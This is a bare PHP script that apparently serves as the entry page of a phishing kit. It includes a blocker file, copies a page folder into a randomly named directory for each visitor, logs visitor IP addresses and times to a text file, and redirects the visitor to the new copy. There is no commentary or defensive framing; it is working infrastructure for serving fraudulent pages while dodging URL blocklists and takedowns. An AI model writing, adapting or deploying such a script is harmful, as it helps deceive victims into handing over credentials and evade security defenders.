<?php

include('blocker.php');

$random = rand(0,100000000000);
$dst    = substr(md5($random), 0, 10);

//+++++++++++++++++// CREATE FOLDER AND COPY FILE \\+++++++++++++++++\\

function recurse_copy($src,$dst)
{
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}

$src="mxJ8zQ";
recurse_copy( $src, $dst );
$ip = getenv("REMOTE_ADDR");
$file = fopen("vu.txt","a");
fwrite($file,$ip." [$dst] |  ".gmdate ("Y-n-d")." | ".gmdate ("H:i:s")."\n");
header("location:".$dst."");

?>